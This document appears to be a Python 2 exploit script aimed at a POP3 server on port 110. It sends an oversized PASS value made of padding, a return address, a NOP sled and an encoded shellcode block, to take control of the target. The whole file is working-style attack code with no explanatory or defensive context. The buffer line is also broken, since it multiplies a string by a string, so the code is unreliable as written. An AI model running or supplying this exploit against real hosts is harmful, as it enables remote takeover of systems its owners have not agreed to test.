#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

shellcode = ("\xbb\x10\xa9\xaf\xe3\xda\xc1\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
"\x52\x31\x5a\x12\x03\x5a\x12\x83\xfa\x55\x4d\x16\x06\x4d\x10"
"\xd9\xf6\x8e\x75\x53\x13\xbf\xb5\x07\x50\x90\x05\x43\x34\x1d"
"\xed\x01\xac\x96\x83\x8d\xc3\x1f\x29\xe8\xea\xa0\x02\xc8\x6d"
"\x23\x59\x1d\x4d\x1a\x92\x50\x8c\x5b\xcf\x99\xdc\x34\x9b\x0c"
"\xf0\x31\xd1\x8c\x7b\x09\xf7\x94\x98\xda\xf6\xb5\x0f\x50\xa1"
"\x15\xae\xb5\xd9\x1f\xa8\xda\xe4\xd6\x43\x28\x92\xe8\x85\x60"
"\x5b\x46\xe8\x4c\xae\x96\x2d\x6a\x51\xed\x47\x88\xec\xf6\x9c"
"\xf2\x2a\x72\x06\x54\xb8\x24\xe2\x64\x6d\xb2\x61\x6a\xda\xb0"
"\x2d\x6f\xdd\x15\x46\x8b\x56\x98\x88\x1d\x2c\xbf\x0c\x45\xf6"
"\xde\x15\x23\x59\xde\x45\x8c\x06\x7a\x0e\x21\x52\xf7\x4d\x2e"
"\x97\x3a\x6d\xae\xbf\x4d\x1e\x9c\x60\xe6\x88\xac\xe9\x20\x4f"
"\xd2\xc3\x95\xdf\x2d\xec\xe5\xf6\xe9\xb8\xb5\x60\xdb\xc0\x5d"
"\x70\xe4\x14\xf1\x20\x4a\xc7\xb2\x90\x2a\xb7\x5a\xfa\xa4\xe8"
"\x7b\x05\x6f\x81\x16\xfc\xf8\x6e\x4e\xfe\xf9\x06\x8d\xfe\xfb"
"\x4c\x18\x18\x91\x60\x4d\xb3\x0e\x18\xd4\x4f\xae\xe5\xc2\x2a"
"\xf0\x6e\xe1\xcb\xbf\x86\x8c\xdf\x28\x67\xdb\xbd\xff\x78\xf1"
"\xa9\x9c\xeb\x9e\x29\xea\x17\x09\x7e\xbb\xe6\x40\xea\x51\x50"
"\xfb\x08\xa8\x04\xc4\x88\x77\xf5\xcb\x11\xf5\x41\xe8\x01\xc3"
"\x4a\xb4\x75\x9b\x1c\x62\x23\x5d\xf7\xc4\x9d\x37\xa4\x8e\x49"
"\xc1\x86\x10\x0f\xce\xc2\xe6\xef\x7f\xbb\xbe\x10\x4f\x2b\x37"
"\x69\xad\xcb\xb8\xa0\x75\xfb\xf2\xe8\xdc\x94\x5a\x79\x5d\xf9"
"\x5c\x54\xa2\x04\xdf\x5c\x5b\xf3\xff\x15\x5e\xbf\x47\xc6\x12"
"\xd0\x2d\xe8\x81\xd1\x67")

buffer = "A" * 2606 + "B" * "\x8f\x35\x4a\x5f" + "\x90" * 16 + shellcode + "C" * (3500-2606-4-351-16)


try:
	print "\Sending evil buffer..."
	s.connect(('<TARGET_IP_ADDRESS>',110))
	data = s.recv(1024)
	s.send('USER username' +'\r\n')
	data = s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	print "\nDone!."
except:
	print "Could not connect to POP3!"
